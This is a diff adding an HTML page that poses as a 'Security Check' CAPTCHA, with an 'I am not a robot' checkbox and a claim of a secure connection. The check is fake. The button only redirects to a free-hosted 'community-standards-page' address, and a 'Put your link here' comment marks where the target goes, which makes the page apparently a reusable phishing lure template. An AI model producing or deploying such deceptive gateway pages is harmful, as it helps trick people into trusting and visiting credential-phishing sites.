@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Verification</title>
+
+<style>
+body{
+    background:#f1f3f6;
+    font-family: Arial, sans-serif;
+}
+
+.container{
+    width:400px;
+    margin:120px auto;
+    background:#ffffff;
+    padding:25px;
+    border-radius:8px;
+    box-shadow:0 0 15px rgba(0,0,0,0.1);
+    text-align:left;
+}
+
+.header{
+    font-size:20px;
+    font-weight:bold;
+    margin-bottom:10px;
+}
+
+.button{
+    background:#0b57d0;
+    color:#fff;
+    border:none;
+    padding:10px 20px;
+    border-radius:5px;
+    cursor:pointer;
+}
+
+.button:hover{
+    background:#0842a0;
+}
+
+.small-text{
+    font-size:12px;
+    color:gray;
+}
+</style>
+
+<script>
+function verify(){
+    var check = document.getElementById("check");
+
+    if(check.checked == true){
+        // Put your link here
+        window.location.href = "https://community-standards-page.netlify.app/";
+    } else {
+        alert("Please complete the security verification.");
+    }
+}
+</script>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="header">🔒 Security Check</div>
+
+<p>Please confirm that you are not a robot to continue.</p>
+
+<input type="checkbox" id="check">
+<label for="check"> I am not a robot </label>
+
+<br><br>
+
+<button class="button" onclick="verify()">Continue</button>
+
+<br><br>
+
+<div class="small-text">
+This website uses a secure connection.
+</div>
+
+</div>
+
+</body>
+</html>
